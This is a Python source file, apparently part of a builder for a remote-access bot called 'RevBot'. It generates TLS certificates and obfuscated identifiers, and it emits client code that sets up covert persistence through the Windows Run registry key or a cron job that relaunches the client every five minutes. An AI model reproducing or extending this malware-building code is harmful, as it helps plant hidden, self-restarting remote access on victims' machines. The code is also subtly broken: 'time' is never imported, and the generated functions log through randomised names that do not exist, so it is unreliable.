import os
import logging
import random
import string
import subprocess
import base64
from Cryptodome.Random import get_random_bytes

TLS_CERT_FILE = "server.crt"
TLS_KEY_FILE = "server.key"

def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def generate_obfuscated_name():
    return f"_{generate_random_string(random.randint(8, 15))}"

def setup_logging(output_dir):
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    log_dir = os.path.join(output_dir, "logs")
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    logger = logging.getLogger("RevBot")
    logger.setLevel(logging.DEBUG)
    handler = logging.FileHandler(os.path.join(log_dir, f"revbot_{int(time.time())}.log"))
    handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
    logger.addHandler(handler)
    return logger

def get_random_aes_key(size=32):
    return get_random_bytes(size)

def generate_tls_certificates(output_dir):
    cert_file = os.path.join(output_dir, TLS_CERT_FILE)
    key_file = os.path.join(output_dir, TLS_KEY_FILE)
    try:
        subprocess.run(["openssl", "genrsa", "-out", key_file, "2048"], check=True, capture_output=True)
        subprocess.run(["openssl", "req", "-new", "-x509", "-key", key_file, "-out", cert_file, "-days", "365", "-subj", "/CN=RevBot"], check=True, capture_output=True)
        logging.getLogger("RevBot").info(f"Generated TLS certificates: {cert_file}, {key_file}")
        print(f"[*] Generated TLS certificates: {cert_file}, {key_file}")
    except subprocess.CalledProcessError as e:
        logging.getLogger("RevBot").error(f"Failed to generate TLS certificates: {e}")
        print(f"[!] Failed to generate TLS certificates: {e}")
        raise

def get_persistence_code(persistence_type, platform, client_filename, func_name):
    logger = logging.getLogger("RevBot")
    if persistence_type == "windows_registry" and platform == "Windows":
        return f"""
def {func_name}():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RevBot", 0, winreg.REG_SZ, os.path.abspath(__file__))
        winreg.CloseKey(key)
        {generate_obfuscated_name()}.debug("Persistence set via Windows Registry")
    except Exception as e:
        {generate_obfuscated_name()}.debug(f"Persistence error: {{e}}")
"""
    elif persistence_type == "cron" and platform in ["Linux", "Darwin"]:
        return f"""
def {func_name}():
    try:
        from crontab import CronTab
        cron = CronTab(user=True)
        job = cron.new(command=f"python3 {{os.path.abspath(__file__)}}")
        job.minute.every(5)
        cron.write()
        {generate_obfuscated_name()}.debug("Persistence set via cron")
    except Exception as e:
        {generate_obfuscated_name()}.debug(f"Persistence error: {{e}}")
"""
    return f"""
def {func_name}():
    {generate_obfuscated_name()}.debug("No persistence configured")
    pass
"""
